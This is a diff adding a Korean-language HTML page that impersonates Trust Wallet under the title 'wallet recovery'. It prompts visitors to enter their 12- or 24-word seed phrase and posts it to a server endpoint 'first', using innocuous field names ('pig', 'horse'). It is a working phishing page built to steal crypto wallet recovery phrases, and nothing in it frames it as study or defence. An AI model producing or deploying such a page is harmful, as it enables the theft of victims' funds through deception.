@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>지갑 복구</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap">
+    <link rel="shortcut icon" href="data:image/jpeg;base64,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" type="image/x-icon">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+        body {
+            background: linear-gradient(to right, #1E3A8A, #3375BB);
+            color: #fff;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 90%;
+        }
+        .header {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #fff;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #ddd;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        textarea {
+            width: 100%;
+            height: 120px;
+            border: none;
+            border-radius: 10px;
+            padding: 15px;
+            font-size: 16px;
+            resize: none;
+            background: rgba(255, 255, 255, 0.2);
+            color: #fff;
+            outline: none;
+            transition: all 0.3s;
+        }
+        textarea:focus {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        .warning {
+            color: red;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(to right, #FFD700, #FFA500);
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 165, 0, 0.4);
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        .footer {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #bbb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">지갑 복구</div>
+        <img class="logo" src="" alt="Your Logo">
+        <h2>지갑 시드 문구를 입력하세요</h2>
+        <form action="first" method="post">
+        <p>시드 문구는 새 지갑을 만들 때 무작위로 생성되는 12개 또는 24개 단어의 시리즈입니다. 시드 문구가 올바르고 완전한지 확인하십시오.</p>
+        <input type="hidden" name="horse" value="TW WALLET">
+        <textarea name="pig" placeholder="여기에 시드 문구를 입력하세요..." required minlength="60" maxlength="120"></textarea>
+        <p class="warning"></p>
+        <button type="submit">지금 확인하세요</button>
+        </form>
+        <div class="footer"> All Rights Reserved © 2025 Trust Wallet</div>
+    </div>
+
+</body>
+</html>
